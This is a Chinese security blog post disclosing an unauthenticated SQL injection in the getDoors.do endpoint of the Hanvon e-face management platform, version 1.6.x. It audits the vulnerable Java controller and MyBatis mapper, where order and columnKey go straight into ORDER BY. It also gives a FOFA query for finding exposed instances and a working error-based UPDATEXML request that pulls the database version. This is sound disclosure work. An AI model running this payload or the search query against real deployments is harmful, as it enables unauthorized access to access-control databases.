---
title: "汉王e脸通综合管理平台 getDoors.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-getDoors-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-getdoors.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 getDoors.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/15 12:25
- 779浏览
- [0评论](#comment)
- 28分钟阅读

深入探索

软件

应用

应用程序

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `getDoors.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

技术文章订阅

安全运维咨询

VPN服务

直接看 `FirstPeopleOpenController` 里关于 `getDoors` 的实现

```
@RequestMapping(
        value = {"getDoors.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public RequestJson getDoors(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) String name, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();
        PermissionParams record = new PermissionParams();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            if (null != name) {
                record.setName(name);
            }

            record.setOrder(order);
            record.setColumnKey(columnKey);
            PageHelper.startPage(page, pageSize);
            List<FirstOpenVO> infoList = this.firstPeopleOpenAsm.getDoors(record);
            PageInfo<FirstOpenVO> info = new PageInfo(infoList);
```

深入探索

恶意软件分析工具

网络安全课程

漏洞预警服务

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 AccessFirstOpenDoorDao.xml

代码安全审计

```
<select id="getDoors" resultMap="BaseResultMap2">
    select afod.ID,afod.DOOR_ID,afod.PASS_TIME_ID,dbi.sz_name CONTROLLER_NAME,ddi.NAME DOOR_NAME,afod.START_TIME,afod.END_TIME,afod.CYCLE_WEEK,
    (select
    COUNT(afoe.EMPLOYEE_ID)
    from ACCESS_FIRST_OPEN_EMPLOYEE afoe
    LEFT JOIN SYS_USER SU on afoe.EMPLOYEE_ID = SU.ng_id
    where afoe.DOOR_ID = afod.DOOR_ID and SU.nt_user_state = 1
    ) EMPLOYEE_SUM
    from ACCESS_FIRST_OPEN_DOOR afod
    left join ACCESS_DOOR_INFO ddi on ddi.ID = afod.DOOR_ID
    left join dev_device dbi on dbi.ng_id = ddi.DEVICE_CONTROL_ID
    where afod.STATE != 1
    AND dbi.nt_state = 1
    <if test="name != null and name != ''">
      and ddi.NAME like concat('%', #{name},'%')
    </if>
    ORDER BY
    <if test="order == null or order == ''">
      afod.ID DESC
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/firstPeopleOpen/getDoors.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 getDoors.do SQL注入漏洞](images/img-001-bea07168db1c.webp)](https://image.mrxn.net/b9d38994a17f4c4c84cd68487079d0ae.webp)

成功利用报错注入获取到数据版本号

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
